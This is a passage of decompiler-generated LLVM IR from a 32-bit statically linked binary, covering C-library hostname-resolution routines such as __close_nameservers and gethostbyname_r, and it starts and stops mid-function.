  %v3_804e2f8 = call i32 @__GI_fclose(i16* %v2_804e2f8, i32 %v3_804e0bf)
  store i32 %v3_804e2f8, i32* %eax.global-to-local, align 4
  %v0_804e2fd = load i32, i32* @esp, align 4
  %v1_804e2fd = inttoptr i32 %v0_804e2fd to i32*
  %v2_804e2fd = load i32, i32* %v1_804e2fd, align 4
  store i32 %v2_804e2fd, i32* %eax.global-to-local, align 4
  %v3_804e2fd = add i32 %v0_804e2fd, 4
  br label %dec_label_pc_804e2fe

dec_label_pc_804e2fe:                             ; preds = %dec_label_pc_804e0a7, %dec_label_pc_804e2f4
  %v0_804e307 = phi i32 [ %v15_804e04f, %dec_label_pc_804e0a7 ], [ %v3_804e2fd, %dec_label_pc_804e2f4 ]
  %v0_804e2fe = load i64, i64* @global_var_8055b9c.109, align 8
  %v1_804e2fe = trunc i64 %v0_804e2fe to i32
  %v2_804e2fe = icmp eq i32 %v1_804e2fe, 0
  %v1_804e305 = icmp eq i1 %v2_804e2fe, false
  br i1 %v1_804e305, label %dec_label_pc_804e335, label %dec_label_pc_804e307

dec_label_pc_804e307:                             ; preds = %dec_label_pc_804e2fe
  %v1_804e307 = add i32 %v0_804e307, -4
  %v2_804e307 = inttoptr i32 %v1_804e307 to i32*
  store i32 28, i32* %v2_804e307, align 4
  %v0_804e309 = load i32, i32* %stack_var_-524, align 4
  %v1_804e309 = call i32 @malloc(i32 %v0_804e309)
  store i32 %v1_804e309, i32* %eax.global-to-local, align 4
  store i32 %v1_804e309, i32* @global_var_8055b98.110, align 8
  %v0_804e315 = load i32, i32* @esp, align 4
  %v1_804e315 = inttoptr i32 %v0_804e315 to i32*
  %v2_804e315 = load i32, i32* %v1_804e315, align 4
  store i32 %v2_804e315, i32* %eax.global-to-local, align 4
  %v1_804e316 = icmp eq i32 %v1_804e309, 0
  br i1 %v1_804e316, label %dec_label_pc_804e325, label %dec_label_pc_804e31a

dec_label_pc_804e31a:                             ; preds = %dec_label_pc_804e307
  store i32 ptrtoint (i32* @global_var_8051304.121 to i32), i32* %esi.global-to-local, align 4
  %v4_804e31f = inttoptr i32 %v1_804e309 to i32*
  store i32 889192450, i32* %v4_804e31f, align 4
  %v6_804e31f = load i32, i32* %esi.global-to-local, align 4
  %v7_804e31f = load i1, i1* @df, align 1
  %v8_804e31f = select i1 %v7_804e31f, i32 -4, i32 4
  %v9_804e31f = add i32 %v8_804e31f, %v1_804e309
  %v10_804e31f = add i32 %v8_804e31f, %v6_804e31f
  store i32 %v9_804e31f, i32* %edi.global-to-local, align 4
  store i32 %v10_804e31f, i32* %esi.global-to-local, align 4
  %v1_804e320 = inttoptr i32 %v10_804e31f to i32*
  %v2_804e320 = load i32, i32* %v1_804e320, align 4
  %v4_804e320 = inttoptr i32 %v9_804e31f to i32*
  store i32 %v2_804e320, i32* %v4_804e320, align 4
  %v5_804e320 = load i32, i32* %edi.global-to-local, align 4
  %v6_804e320 = load i32, i32* %esi.global-to-local, align 4
  %v9_804e320 = add i32 %v5_804e320, %v8_804e31f
  %v10_804e320 = add i32 %v6_804e320, %v8_804e31f
  store i32 %v9_804e320, i32* %edi.global-to-local, align 4
  store i32 %v10_804e320, i32* %esi.global-to-local, align 4
  %v1_804e321 = inttoptr i32 %v10_804e320 to i32*
  %v2_804e321 = load i32, i32* %v1_804e321, align 4
  %v4_804e321 = inttoptr i32 %v9_804e320 to i32*
  store i32 %v2_804e321, i32* %v4_804e321, align 4
  %v5_804e321 = load i32, i32* %edi.global-to-local, align 4
  %v6_804e321 = load i32, i32* %esi.global-to-local, align 4
  %v9_804e321 = add i32 %v5_804e321, %v8_804e31f
  %v10_804e321 = add i32 %v6_804e321, %v8_804e31f
  store i32 %v9_804e321, i32* %edi.global-to-local, align 4
  store i32 %v10_804e321, i32* %esi.global-to-local, align 4
  %v1_804e322 = inttoptr i32 %v10_804e321 to i32*
  %v2_804e322 = load i32, i32* %v1_804e322, align 4
  %v4_804e322 = inttoptr i32 %v9_804e321 to i32*
  store i32 %v2_804e322, i32* %v4_804e322, align 4
  br label %dec_label_pc_804e32f

dec_label_pc_804e325:                             ; preds = %dec_label_pc_804e307
  store i32 ptrtoint (i32* @global_var_8051304.121 to i32), i32* @global_var_8055b98.110, align 8
  br label %dec_label_pc_804e32f

dec_label_pc_804e32f:                             ; preds = %dec_label_pc_804e31a, %dec_label_pc_804e325
  %v0_804e32f = load i64, i64* @global_var_8055b9c.109, align 8
  %v1_804e32f = trunc i64 %v0_804e32f to i32
  %v2_804e32f = add i32 %v1_804e32f, 1
  %v15_804e32f = sext i32 %v2_804e32f to i64
  store i64 %v15_804e32f, i64* @global_var_8055b9c.109, align 8
  br label %dec_label_pc_804e335

dec_label_pc_804e335:                             ; preds = %dec_label_pc_804e2fe, %dec_label_pc_804e32f
  %v0_804e335 = load i32, i32* @global_var_8055ba0.104, align 32
  %v1_804e335 = icmp eq i32 %v0_804e335, 0
  %v1_804e33c = icmp eq i1 %v1_804e335, false
  br i1 %v1_804e33c, label %dec_label_pc_804e3a1, label %dec_label_pc_804e33e

dec_label_pc_804e33e:                             ; preds = %dec_label_pc_804e335
  %v0_804e33e = load i32, i32* @esp, align 4
  %v1_804e33e = add i32 %v0_804e33e, -4
  %v2_804e33e = inttoptr i32 %v1_804e33e to i32*
  store i32 255, i32* %v2_804e33e, align 4
  %v1_804e343 = add i32 %v0_804e33e, 8
  store i32 %v1_804e343, i32* @ebx, align 4
  %v2_804e347 = add i32 %v0_804e33e, -8
  %v3_804e347 = inttoptr i32 %v2_804e347 to i32*
  store i32 %v1_804e343, i32* %v3_804e347, align 4
  %v0_804e348 = call i32 @__GI_gethostname()
  store i32 %v0_804e348, i32* %eax.global-to-local, align 4
  %v0_804e34d = load i32, i32* @esp, align 4
  %v1_804e34d = add i32 %v0_804e34d, 271
  %v2_804e34d = inttoptr i32 %v1_804e34d to i8*
  store i8 0, i8* %v2_804e34d, align 1
  %v0_804e355 = load i32, i32* @esp, align 4
  %v1_804e355 = inttoptr i32 %v0_804e355 to i32*
  %v2_804e355 = load i32, i32* %v1_804e355, align 4
  store i32 %v2_804e355, i32* @edi, align 4
  %v3_804e355 = add i32 %v0_804e355, 4
  %v1_804e356 = inttoptr i32 %v3_804e355 to i32*
  %v2_804e356 = load i32, i32* %v1_804e356, align 4
  store i32 %v2_804e356, i32* @ebp, align 4
  %v1_804e357 = icmp eq i32 %v0_804e348, 0
  %v1_804e359 = icmp eq i1 %v1_804e357, false
  br i1 %v1_804e359, label %dec_label_pc_804e3a1, label %dec_label_pc_804e35b

dec_label_pc_804e35b:                             ; preds = %dec_label_pc_804e33e
  store i32 46, i32* %v1_804e356, align 4
  %v0_804e35d = load i32, i32* @ebx, align 4
  store i32 %v0_804e35d, i32* %v1_804e355, align 4
  %v0_804e35e = load i32, i32* %stack_var_-524, align 4
  %v2_804e35e = inttoptr i32 %v0_804e35e to i8*
  %v3_804e35e = call i32 @__GI_strchr(i8* %v2_804e35e, i32 %v3_804e0bf)
  store i32 %v3_804e35e, i32* %eax.global-to-local, align 4
  %v0_804e363 = load i32, i32* @esp, align 4
  %v1_804e363 = inttoptr i32 %v0_804e363 to i32*
  %v2_804e363 = load i32, i32* %v1_804e363, align 4
  store i32 %v2_804e363, i32* @ebx, align 4
  %v3_804e363 = add i32 %v0_804e363, 4
  %v1_804e364 = inttoptr i32 %v3_804e363 to i32*
  %v2_804e364 = load i32, i32* %v1_804e364, align 4
  store i32 %v2_804e364, i32* @esi, align 4
  %v1_804e365 = icmp eq i32 %v3_804e35e, 0
  br i1 %v1_804e365, label %dec_label_pc_804e3a1, label %dec_label_pc_804e369

dec_label_pc_804e369:                             ; preds = %dec_label_pc_804e35b
  %v1_804e369 = add i32 %v3_804e35e, 1
  %v2_804e36c = inttoptr i32 %v1_804e369 to i8*
  %v3_804e36c = load i8, i8* %v2_804e36c, align 1
  %v4_804e36c = icmp eq i8 %v3_804e36c, 0
  br i1 %v4_804e36c, label %dec_label_pc_804e3a1, label %dec_label_pc_804e372

dec_label_pc_804e372:                             ; preds = %dec_label_pc_804e369
  store i32 %v1_804e369, i32* %v1_804e364, align 4
  %v0_804e373 = call i32 @__GI_strdup()
  store i32 %v0_804e373, i32* %eax.global-to-local, align 4
  store i32 %v0_804e373, i32* @ebx, align 4
  %v1_804e37b = icmp eq i32 %v0_804e373, 0
  br i1 %v1_804e37b, label %dec_label_pc_804e3a1, label %dec_label_pc_804e37f

dec_label_pc_804e37f:                             ; preds = %dec_label_pc_804e372
  %v0_804e37a = load i32, i32* @esp, align 4
  %v1_804e37a = inttoptr i32 %v0_804e37a to i32*
  store i32 4, i32* %v1_804e37a, align 4
  %v0_804e381 = load i32, i32* %stack_var_-524, align 4
  %v1_804e381 = call i32 @malloc(i32 %v0_804e381)
  store i32 %v1_804e381, i32* %eax.global-to-local, align 4
  store i32 %v1_804e381, i32* @global_var_8055b94.105, align 4
  %v1_804e38c = icmp eq i32 %v1_804e381, 0
  %v1_804e38e = icmp eq i1 %v1_804e38c, false
  %v0_804e399 = load i32, i32* @ebx, align 4
  br i1 %v1_804e38e, label %dec_label_pc_804e399, label %dec_label_pc_804e390

dec_label_pc_804e390:                             ; preds = %dec_label_pc_804e37f
  %v0_804e38b = load i32, i32* @esp, align 4
  %v1_804e38b = inttoptr i32 %v0_804e38b to i32*
  store i32 %v0_804e399, i32* %v1_804e38b, align 4
  %v0_804e391 = load i32, i32* %stack_var_-524, align 4
  %v1_804e391 = call i32 @free(i32 %v0_804e391)
  store i32 %v1_804e391, i32* %eax.global-to-local, align 4
  %v0_804e396 = load i32, i32* @esp, align 4
  %v1_804e396 = inttoptr i32 %v0_804e396 to i32*
  %v2_804e396 = load i32, i32* %v1_804e396, align 4
  store i32 %v2_804e396, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e3a1

dec_label_pc_804e399:                             ; preds = %dec_label_pc_804e37f
  %v2_804e399 = inttoptr i32 %v1_804e381 to i32*
  store i32 %v0_804e399, i32* %v2_804e399, align 4
  %v0_804e39b = load i32, i32* @global_var_8055ba0.104, align 32
  %v1_804e39b = add i32 %v0_804e39b, 1
  store i32 %v1_804e39b, i32* @global_var_8055ba0.104, align 32
  br label %dec_label_pc_804e3a1

dec_label_pc_804e3a1:                             ; preds = %dec_label_pc_804e09a, %dec_label_pc_804e372, %dec_label_pc_804e369, %dec_label_pc_804e35b, %dec_label_pc_804e33e, %dec_label_pc_804e335, %dec_label_pc_804e390, %dec_label_pc_804e399
  %v0_804e3a1 = load i32, i32* @global_var_8055b90.112, align 16
  store i32 %v0_804e3a1, i32* %eax.global-to-local, align 4
  %v1_804e3a6 = icmp eq i32 %v0_804e3a1, 0
  br i1 %v1_804e3a6, label %dec_label_pc_804e3ac, label %dec_label_pc_804e3aa

dec_label_pc_804e3aa:                             ; preds = %dec_label_pc_804e3a1
  %v0_804e3aa = load i32, i32* %stack_var_-524, align 4
  %v1_804e3aa = call i32 @unknown_0(i32 %v0_804e3aa)
  store i32 %v1_804e3aa, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e3ac

dec_label_pc_804e3ac:                             ; preds = %dec_label_pc_804e3aa, %dec_label_pc_804e3a1
  %v0_804e3b6 = phi i32 [ %v1_804e3aa, %dec_label_pc_804e3aa ], [ 0, %dec_label_pc_804e3a1 ]
  %v0_804e3ac = load i32, i32* @esp, align 4
  %v1_804e3ac = add i32 %v0_804e3ac, 508
  %v1_804e3b2 = inttoptr i32 %v1_804e3ac to i32*
  %v2_804e3b2 = load i32, i32* %v1_804e3b2, align 4
  store i32 %v2_804e3b2, i32* @ebx, align 4
  %v3_804e3b2 = add i32 %v0_804e3ac, 512
  %v1_804e3b3 = inttoptr i32 %v3_804e3b2 to i32*
  %v2_804e3b3 = load i32, i32* %v1_804e3b3, align 4
  store i32 %v2_804e3b3, i32* @esi, align 4
  %v3_804e3b4 = add i32 %v0_804e3ac, 520
  %v1_804e3b5 = inttoptr i32 %v3_804e3b4 to i32*
  %v2_804e3b5 = load i32, i32* %v1_804e3b5, align 4
  store i32 %v2_804e3b5, i32* @ebp, align 4
  ret i32 %v0_804e3b6

; uselistorder directives
  uselistorder i32 %v0_804e399, { 1, 0 }
  uselistorder i32 %v3_804e35e, { 1, 0, 2 }
  uselistorder i32 %v1_804e309, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_804e2d3, { 4, 3, 2, 1, 0 }
  uselistorder i8* %v2_804e0f7, { 7, 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %v1_804e2bf, { 1, 0 }
  uselistorder i32 %v3_804e27f, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804e25e, { 1, 2, 0 }
  uselistorder i32 %v2_804e21b, { 1, 0 }
  uselistorder i32 %v0_804e1fe, { 1, 2, 0 }
  uselistorder i32 %v0_804e1dc, { 1, 0, 2 }
  uselistorder i32 %v0_804e12e, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v2_804e117, { 1, 0 }
  uselistorder i32 %v0_804e10a, { 1, 0 }
  uselistorder i32 %v0_804e0fc, { 1, 0 }
  uselistorder i32 %v3_804e0f7, { 1, 0, 2 }
  uselistorder i32 %v3_804e0bf, { 0, 1, 6, 4, 5, 2, 3, 7, 8 }
  uselistorder i32 %., { 1, 0, 2 }
  uselistorder i32* %stack_var_-524, { 0, 2, 3, 5, 4, 1, 6, 7 }
  uselistorder i32* %eax.global-to-local, { 19, 17, 18, 20, 21, 22, 23, 24, 25, 27, 26, 28, 0, 1, 2, 3, 6, 4, 5, 29, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 508, { 1, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder i32 ()* @fgets, { 1, 0 }
  uselistorder i32 (i32)* @atol, { 0, 4, 3, 2, 1 }
  uselistorder i32 ()* @__GI_strdup, { 0, 2, 1 }
  uselistorder i32 ()* @realloc, { 2, 1, 0 }
  uselistorder i16 10, { 3, 0, 1, 2 }
  uselistorder i32 492, { 0, 1, 3, 2 }
  uselistorder i32 488, { 0, 3, 2, 1 }
  uselistorder i32 ()* @skip_nospace, { 2, 1, 0 }
  uselistorder i32 ()* @skip_and_NUL_space, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_fopen, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_80512db.91 to i32), { 0, 2, 1 }
  uselistorder i8** @global_var_8053585.108, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_8053585.108 to i8*), { 1, 0 }
  uselistorder i8 3, { 1, 0, 2 }
  uselistorder i64* @global_var_8053584.111, { 1, 0 }
  uselistorder i8* bitcast (i64* @global_var_8053584.111 to i8*), { 1, 0 }
  uselistorder i32 ptrtoint ([17 x i8]* @global_var_80512c1.113 to i32), { 0, 2, 1 }
  uselistorder [17 x i8]* @global_var_80512c1.113, { 1, 0 }
  uselistorder label %dec_label_pc_804e3a1, { 7, 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_804e335, { 1, 0 }
  uselistorder label %dec_label_pc_804e32f, { 1, 0 }
  uselistorder label %dec_label_pc_804e2fe, { 1, 0 }
  uselistorder label %dec_label_pc_804e2d3, { 1, 0 }
  uselistorder label %dec_label_pc_804e2d3.backedge, { 3, 10, 9, 8, 7, 0, 1, 2, 4, 6, 5 }
  uselistorder label %dec_label_pc_804e2bb, { 1, 0 }
  uselistorder label %dec_label_pc_804e207, { 1, 0 }
  uselistorder label %dec_label_pc_804e1e7, { 1, 0 }
  uselistorder label %dec_label_pc_804e1fe.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804e166, { 1, 0 }
  uselistorder label %dec_label_pc_804e09a, { 2, 0, 1 }
}

define i32 @__close_nameservers() local_unnamed_addr {
entry:
  %v0_804e3b8 = load i32, i32* @global_var_8055b98.110, align 8
  %v9_804e3bd = icmp eq i32 %v0_804e3b8, 134550276
  br i1 %v9_804e3bd, label %entry.dec_label_pc_804e3cb_crit_edge, label %dec_label_pc_804e3c4

entry.dec_label_pc_804e3cb_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804e3cb

dec_label_pc_804e3c4:                             ; preds = %entry
  %v1_804e3c5 = call i32 @free(i32 %v0_804e3b8)
  store i32 %v0_804e3b8, i32* @ecx, align 4
  br label %dec_label_pc_804e3cb

dec_label_pc_804e3cb:                             ; preds = %entry.dec_label_pc_804e3cb_crit_edge, %dec_label_pc_804e3c4
  store i32 0, i32* @global_var_8055b98.110, align 8
  store i64 0, i64* @global_var_8055b9c.109, align 8
  %v0_804e3f81 = load i32, i32* @global_var_8055ba0.104, align 32
  %v1_804e3fd2 = icmp eq i32 %v0_804e3f81, 0
  %v1_804e3ff9 = icmp eq i1 %v1_804e3fd2, false
  br i1 %v1_804e3ff9, label %dec_label_pc_804e3e1, label %dec_label_pc_804e401

dec_label_pc_804e3e1:                             ; preds = %dec_label_pc_804e3cb, %dec_label_pc_804e3e1
  %v0_804e3f810 = phi i32 [ %v0_804e3f8, %dec_label_pc_804e3e1 ], [ %v0_804e3f81, %dec_label_pc_804e3cb ]
  %v1_804e3e1 = add i32 %v0_804e3f810, -1
  store i32 %v1_804e3e1, i32* @global_var_8055ba0.104, align 32
  %v0_804e3ea = load i32, i32* @global_var_8055b94.105, align 4
  %v2_804e3ef = mul i32 %v1_804e3e1, 4
  %v3_804e3ef = add i32 %v0_804e3ea, %v2_804e3ef
  %v4_804e3ef = inttoptr i32 %v3_804e3ef to i32*
  %v5_804e3ef = load i32, i32* %v4_804e3ef, align 4
  %v1_804e3f2 = call i32 @free(i32 %v5_804e3ef)
  %v0_804e3f8 = load i32, i32* @global_var_8055ba0.104, align 32
  %v1_804e3fd = icmp eq i32 %v0_804e3f8, 0
  %v1_804e3ff = icmp eq i1 %v1_804e3fd, false
  br i1 %v1_804e3ff, label %dec_label_pc_804e3e1, label %dec_label_pc_804e401

dec_label_pc_804e401:                             ; preds = %dec_label_pc_804e3e1, %dec_label_pc_804e3cb
  %v0_804e401 = load i32, i32* @global_var_8055b94.105, align 4
  %v1_804e407 = call i32 @free(i32 %v0_804e401)
  store i32 0, i32* @global_var_8055b94.105, align 4
  ret i32 %v0_804e401

; uselistorder directives
  uselistorder i32 %v0_804e3f8, { 1, 0 }
  uselistorder i32 %v0_804e3b8, { 0, 2, 1 }
  uselistorder i32* @global_var_8055ba0.104, { 2, 3, 0, 4, 5, 6, 7, 8, 9, 10, 11, 1, 12 }
  uselistorder i64* @global_var_8055b9c.109, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804e3e1, { 1, 0 }
  uselistorder label %dec_label_pc_804e3cb, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_804e438 = inttoptr i32 %arg3 to i32*
  %v10_804e438 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_804e438, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_804e438
}

define i32 @gethostbyname_r(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %stack_var_4 = alloca i8*, align 4
  store i8* %arg1, i8** %stack_var_4, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v0_804e447 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @ebp, align 4
  store i32 %arg5, i32* %eax.global-to-local, align 4
  %v1_804e453 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_804e453, align 4
  store i32 22, i32* @esi, align 4
  %v3_804e45e = load i8*, i8** %stack_var_4, align 4
  %v5_804e45e = icmp eq i8* %v3_804e45e, null
  br i1 %v5_804e45e, label %dec_label_pc_804e6d4, label %dec_label_pc_804e469

dec_label_pc_804e469:                             ; preds = %entry
  %v1_804e469 = call i32 @__GI___errno_location(i32 %v0_804e447)
  store i32 %v1_804e469, i32* @eax, align 4
  store i32 %v1_804e469, i32* @ebx, align 4
  %v1_804e470 = inttoptr i32 %v1_804e469 to i32*
  %v2_804e470 = load i32, i32* %v1_804e470, align 4
  store i32 %v2_804e470, i32* @edi, align 4
  store i32 0, i32* %v1_804e470, align 4
  %v8_804e481 = inttoptr i32 %arg3 to i8*
  %tmp50 = bitcast i8** %stack_var_4 to i32*
  %v3_804e48b3 = load i32, i32* %tmp50, align 4
  %v10_804e48f = load i32, i32* %stack_var_-72, align 4
  %v11_804e48f = call i32 @__get_hosts_byname_r(i32 %v3_804e48b3, i32 2, i32 %arg2, i32 %arg3, i32 %arg5, i32 %arg6, i32 %v10_804e48f)
  store i32 %v11_804e48f, i32* %eax.global-to-local, align 4
  store i32 %v11_804e48f, i32* @esi, align 4
  %v1_804e499 = icmp eq i32 %v11_804e48f, 0
  %v1_804e49b = icmp eq i1 %v1_804e499, false
  br i1 %v1_804e49b, label %dec_label_pc_804e4a4, label %dec_label_pc_804e49d

dec_label_pc_804e49d:                             ; preds = %dec_label_pc_804e469
  %v0_804e49d = load i32, i32* @edi, align 4
  %v1_804e49d = load i32, i32* @ebx, align 4
  %v2_804e49d = inttoptr i32 %v1_804e49d to i32*
  store i32 %v0_804e49d, i32* %v2_804e49d, align 4
  br label %dec_label_pc_804e6d4

dec_label_pc_804e4a4:                             ; preds = %dec_label_pc_804e469
  store i32 %arg6, i32* %edx.global-to-local, align 4
  %v1_804e4a8 = inttoptr i32 %arg6 to i32*
  %v2_804e4a8 = load i32, i32* %v1_804e4a8, align 4
  store i32 %v2_804e4a8, i32* %eax.global-to-local, align 4
  %v9_804e4aa = icmp eq i32 %v2_804e4a8, 1
  br i1 %v9_804e4aa, label %dec_label_pc_804e4bd, label %dec_label_pc_804e4af

dec_label_pc_804e4af:                             ; preds = %dec_label_pc_804e4a4
  %v9_804e4af = icmp eq i32 %v2_804e4a8, 4
  br i1 %v9_804e4af, label %dec_label_pc_804e4da, label %dec_label_pc_804e4b4

dec_label_pc_804e4b4:                             ; preds = %dec_label_pc_804e4af
  %v1_804e4b4 = add i32 %v2_804e4a8, 1
  %v8_804e4b4 = icmp eq i32 %v1_804e4b4, 0
  store i32 %v1_804e4b4, i32* %eax.global-to-local, align 4
  %v1_804e4b5 = icmp eq i1 %v8_804e4b4, false
  br i1 %v1_804e4b5, label %dec_label_pc_804e6d4, label %dec_label_pc_804e4ca

dec_label_pc_804e4bd:                             ; preds = %dec_label_pc_804e4a4
  %v9_804e4bf = icmp eq i32 %v11_804e48f, 2
  %v1_804e4c2 = zext i1 %v9_804e4bf to i32
  store i32 %v1_804e4c2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e4da

dec_label_pc_804e4ca:                             ; preds = %dec_label_pc_804e4b4
  %v0_804e4ca = load i32, i32* @ebx, align 4
  %v1_804e4ca = inttoptr i32 %v0_804e4ca to i32*
  %v2_804e4ca = load i32, i32* %v1_804e4ca, align 4
  %v11_804e4ca = icmp eq i32 %v2_804e4ca, 2
  %v1_804e4cd = icmp eq i1 %v11_804e4ca, false
  br i1 %v1_804e4cd, label %dec_label_pc_804e6d4, label %dec_label_pc_804e4da

dec_label_pc_804e4da:                             ; preds = %dec_label_pc_804e4af, %dec_label_pc_804e4ca, %dec_label_pc_804e4bd
  %storemerge = phi i32 [ %v1_804e4c2, %dec_label_pc_804e4bd ], [ 0, %dec_label_pc_804e4ca ], [ 0, %dec_label_pc_804e4af ]
  store i32 %storemerge, i32* %stack_var_-72, align 4
  %v0_804e4da = load i32, i32* @edi, align 4
  %v1_804e4da = load i32, i32* @ebx, align 4
  %v2_804e4da = inttoptr i32 %v1_804e4da to i32*
  store i32 %v0_804e4da, i32* %v2_804e4da, align 4
  store i32 -1, i32* %v1_804e4a8, align 4
  %v3_804e4e64 = load i32, i32* %tmp50, align 4
  %v0_804e4ea.cast = inttoptr i32 %v3_804e4e64 to i8*
  %v3_804e4ea = call i32 @strlen(i8* %v0_804e4ea.cast)
  store i32 %v3_804e4ea, i32* %eax.global-to-local, align 4
  %v1_804e4f0 = add i32 %v3_804e4ea, 1
  store i32 %v1_804e4f0, i32* %ebx.global-to-local, align 4
  %v0_804e4f3 = load i32, i32* @ebp, align 4
  %v7_804e4f5 = icmp sgt i32 %v0_804e4f3, %v1_804e4f0
  br i1 %v7_804e4f5, label %dec_label_pc_804e4fb, label %dec_label_pc_804e6cf

dec_label_pc_804e4fb:                             ; preds = %dec_label_pc_804e4da
  %v6_804e504 = call i32 @memcpy(i8* %v8_804e481, i32 %v3_804e4e64, i32 %v1_804e4f0)
  %v1_804e50d = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e50d = add i32 %v1_804e50d, %arg3
  store i32 %v2_804e50d, i32* @edx, align 4
  %v0_804e50f = load i32, i32* @ebp, align 4
  %v2_804e50f = sub i32 %v0_804e50f, %v1_804e50d
  %v1_804e515 = sub i32 0, %v2_804e50d
  %v1_804e517 = urem i32 %v1_804e515, 4
  store i32 %v1_804e517, i32* %eax.global-to-local, align 4
  %v2_804e51a = sub i32 %v2_804e50f, %v1_804e517
  %v1_804e51c = add i32 %v2_804e51a, -8
  %v7_804e52c = icmp sgt i32 %v1_804e51c, 255
  br i1 %v7_804e52c, label %dec_label_pc_804e532, label %dec_label_pc_804e6cf

dec_label_pc_804e532:                             ; preds = %dec_label_pc_804e4fb
  %v2_804e532 = add i32 %v2_804e50d, %v1_804e517
  store i32 %v2_804e532, i32* @edi, align 4
  %v1_804e535 = add i32 %v2_804e532, 8
  store i32 %v1_804e535, i32* @ebp, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v2_804e53c = inttoptr i32 %v2_804e532 to i32*
  store i32 %arg3, i32* %v2_804e53c, align 4
  %v0_804e53e = load i32, i32* @edi, align 4
  %v1_804e53e = add i32 %v0_804e53e, 4
  %v2_804e53e = inttoptr i32 %v1_804e53e to i32*
  store i32 0, i32* %v2_804e53e, align 4
  %v0_804e545 = load i32, i32* @edi, align 4
  %v1_804e545 = add i32 %v0_804e545, 16
  store i32 %v1_804e545, i32* @esi, align 4
  %v3_804e5496 = load i32, i32* %tmp50, align 4
  %v0_804e54d.cast = inttoptr i32 %v3_804e5496 to i8*
  %v5_804e54d = call i32 @inet_aton(i8* %v0_804e54d.cast, i32 %v1_804e545)
  store i32 %v5_804e54d, i32* %eax.global-to-local, align 4
  store i32 %v1_804e545, i32* %edx.global-to-local, align 4
  %v1_804e554 = icmp eq i32 %v5_804e54d, 0
  br i1 %v1_804e554, label %dec_label_pc_804e597, label %dec_label_pc_804e558

dec_label_pc_804e558:                             ; preds = %dec_label_pc_804e532
  %v0_804e558 = load i32, i32* @esi, align 4
  %v1_804e558 = load i32, i32* @edi, align 4
  %v2_804e558 = add i32 %v1_804e558, 8
  %v3_804e558 = inttoptr i32 %v2_804e558 to i32*
  store i32 %v0_804e558, i32* %v3_804e558, align 4
  %v0_804e55b = load i32, i32* @ebp, align 4
  %v1_804e55b = add i32 %v0_804e55b, 4
  %v2_804e55b = inttoptr i32 %v1_804e55b to i32*
  store i32 0, i32* %v2_804e55b, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_804e56a = inttoptr i32 %arg2 to i32*
  store i32 %arg3, i32* %v2_804e56a, align 4
  %v0_804e56c = load i32, i32* @edi, align 4
  %v1_804e56c = load i32, i32* %edx.global-to-local, align 4
  %v2_804e56c = add i32 %v1_804e56c, 4
  %v3_804e56c = inttoptr i32 %v2_804e56c to i32*
  store i32 %v0_804e56c, i32* %v3_804e56c, align 4
  %v0_804e56f = load i32, i32* %edx.global-to-local, align 4
  %v1_804e56f = add i32 %v0_804e56f, 8
  %v2_804e56f = inttoptr i32 %v1_804e56f to i32*
  store i32 2, i32* %v2_804e56f, align 4
  %v0_804e576 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e576 = add i32 %v0_804e576, 12
  %v2_804e576 = inttoptr i32 %v1_804e576 to i32*
  store i32 4, i32* %v2_804e576, align 4
  %v0_804e57d = load i32, i32* @ebp, align 4
  %v1_804e57d = load i32, i32* %edx.global-to-local, align 4
  %v2_804e57d = add i32 %v1_804e57d, 16
  %v3_804e57d = inttoptr i32 %v2_804e57d to i32*
  store i32 %v0_804e57d, i32* %v3_804e57d, align 4
  store i32 %arg5, i32* %eax.global-to-local, align 4
  %v0_804e584 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804e584, i32* %v1_804e453, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_804e4a8, align 4
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804e6d4

dec_label_pc_804e597:                             ; preds = %dec_label_pc_804e532
  %v2_804e597 = load i32, i32* %stack_var_-72, align 4
  %v3_804e597 = icmp eq i32 %v2_804e597, 0
  br i1 %v3_804e597, label %dec_label_pc_804e5a9, label %dec_label_pc_804e59d

dec_label_pc_804e59d:                             ; preds = %dec_label_pc_804e597
  br label %dec_label_pc_804e5e2

dec_label_pc_804e5a9:                             ; preds = %dec_label_pc_804e597
  %v2_804e5c1 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804e5c1, i32* %eax.global-to-local, align 4
  %v6_804e5cc = ptrtoint i32* %stack_var_-60 to i32
